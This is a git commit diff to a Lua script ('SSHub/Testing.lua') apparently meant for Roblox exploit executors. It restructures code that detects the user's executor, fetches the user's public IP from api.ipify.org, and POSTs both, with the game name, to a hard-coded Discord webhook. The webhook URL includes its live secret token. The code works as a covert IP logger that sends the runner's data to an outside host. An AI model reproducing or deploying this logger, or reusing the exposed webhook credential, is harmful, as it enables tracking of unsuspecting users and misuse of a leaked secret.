b77bb295ee10c3515c6d1235c5fb1d4095a85b1d
Tupi <65321514+miguel831@users.noreply.github.com>
2022-11-30 18:08:21 -0400

    Update Testing.lua

--- SSHub/Testing.lua
+++ SSHub/Testing.lua
@@ -1,9 +1,7 @@
-local Info = {
-    WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB",
-    ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?",
-    Ip = tostring(game:HttpGet("https://api.ipify.org", true))
-}
+local WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB"
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
 local HttpService = game:GetService("HttpService")
+local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local UserId = game.Players.LocalPlayer.UserId
 function InfoSpoofer(Game)
     if UserId == 860289947 or UserId == 446350986 then
@@ -33,19 +31,19 @@ function InfoSpoofer(Game)
                         },
                         {
                             ["name"] = "Executor",
-                            ["value"] = Info.ExecutorUsing,
+                            ["value"] = ExecutorUsing,
                             ["inline"] = true
                         },
                         {
-                            ["name"]= "Ip",
-                            ["value"]= "||"..Info.Ip.."||",
-                            ["inline"]= true
+                            ["name"] = "Ip",
+                            ["value"] = "||"..Ip.."||",
+                            ["inline"] = true
                         },
                         {
-                            ["name"]= "Game",
-                            ["value"]= Game or nil,
-                            ["inline"]= true
-                        },
+                            ["name"] = "Game",
+                            ["value"] = Game or nil,
+                            ["inline"] = true
+                        }
                     }
                 }
             }
@@ -53,9 +51,8 @@ function InfoSpoofer(Game)
         local Headers = {["Content-Type"] = "application/json"}
         local Encoded = HttpService:JSONEncode(Data)
         local Request = http_request or request or HttpPost or syn.request
-        local Final = {Url = Info.WeebHook, Body = Encoded, Method = "POST", Headers = Headers}
+        local Final = {Url = WeebHook, Body = Encoded, Method = "POST", Headers = Headers}
         Request(Final)
         return Data
     end
 end
-return Info
